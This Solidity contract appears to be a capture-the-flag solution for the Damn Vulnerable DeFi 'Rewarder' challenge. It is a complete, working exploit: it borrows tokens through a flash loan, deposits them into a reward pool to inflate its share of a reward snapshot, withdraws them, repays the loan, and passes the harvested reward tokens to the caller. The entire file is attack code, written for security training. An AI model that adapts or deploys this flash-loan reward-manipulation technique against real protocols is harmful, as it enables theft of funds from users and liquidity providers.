// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract AttackRewarderPool {
    TheRewarderPool rewardPool;
    FlashLoanerPool flashPool;
    RewardToken rewardToken;
    DamnValuableToken liquidityToken;

    constructor(
        TheRewarderPool _rewardPool,
        FlashLoanerPool _flashPool,
        RewardToken _rewardToken,
        DamnValuableToken _dvt
    ) {
        rewardPool = _rewardPool;
        flashPool = _flashPool;
        rewardToken = _rewardToken;
        liquidityToken = _dvt;
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
    }

    function attack(uint256 amt) public payable {
        flashPool.flashLoan(amt);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
